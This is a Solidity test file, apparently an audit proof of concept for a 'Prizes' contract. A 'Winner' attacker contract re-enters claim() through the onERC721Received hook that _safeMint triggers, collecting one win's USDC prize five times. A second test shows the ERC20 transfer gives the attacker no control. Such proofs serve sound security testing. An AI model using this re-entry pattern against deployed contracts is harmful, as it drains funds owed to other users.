// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Proof} from "proof/Vm.sol";
import {Prizes} from "../src/Prizes.sol";

// Unmodified OpenZeppelin 5.4.0 ERC20 with 6 decimals; mint is exposed for the setup only.
contract Usdc is ERC20("USD Coin", "USDC") {
    function decimals() public pure override returns (uint8) { return 6; }
    function mint(address to, uint256 v) external { _mint(to, v); }
}

// Test-only child: the draw that records wins is omitted from the snippet.
contract TestPrizes is Prizes {
    constructor(IERC20 t) Prizes(t) {}
    function setWins(address a, uint256 n) external { wins[a] = n; }
}

// A winner contract that tries to re-enter claim from every place it could get control.
// `viaHook` picks whether onERC721Received re-enters (true) or only the other entry points try.
contract Winner {
    TestPrizes public prizes;
    bool public viaHook;
    uint256 public depth;
    uint256 public fallbackCalls;
    constructor(TestPrizes p, bool h) { prizes = p; viaHook = h; }
    function claim() external { prizes.claim(); }
    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {
        if (viaHook && depth < 4) { depth++; prizes.claim(); }
        return this.onERC721Received.selector;
    }
    fallback() external payable { fallbackCalls++; if (depth < 4) { depth++; prizes.claim(); } }
}

contract PrizesProof is Proof {
    Usdc usdc;
    TestPrizes prizes;

    function setUp() public {
        usdc = new Usdc();
        prizes = new TestPrizes(IERC20(address(usdc)));
        usdc.mint(address(prizes), 10_000e6); // the prize pot for every winner
    }

    // Decoy: claim pays USDC before zeroing wins, but an OpenZeppelin ERC20 transfer never calls
    // the recipient, so a winner that only waits for the USDC payment gets no chance to re-enter.
    function test_decoy_usdcTransferGivesNoControl() public {
        Winner w = new Winner(prizes, false);
        prizes.setWins(address(w), 1);
        w.claim();
        assertEq(w.fallbackCalls(), 0, "the ERC20 transfer called the recipient");
        assertEq(w.depth(), 0, "no re-entry happened");
        assertEq(usdc.balanceOf(address(w)), 100e6, "paid exactly one prize");
        assertEq(prizes.balanceOf(address(w)), 1, "one trophy");
        assertEq(prizes.wins(address(w)), 0, "wins cleared");
        w.claim();
        assertEq(usdc.balanceOf(address(w)), 100e6, "a second claim pays nothing");
    }

    // Real cause: _safeMint calls onERC721Received before wins is zeroed, so the winner
    // re-enters claim and is paid its prize again on every nested call.
    function test_loss_safeMintHookReentersClaim() public {
        Winner w = new Winner(prizes, true);
        prizes.setWins(address(w), 1);
        w.claim();
        assertEq(w.depth(), 4, "re-entered four times through the receiver hook");
        assertEq(usdc.balanceOf(address(w)), 500e6, "one win paid five times");
        assertEq(prizes.balanceOf(address(w)), 5, "five trophies for one win");
        assertEq(w.fallbackCalls(), 0, "control came only from the hook");
    }
}
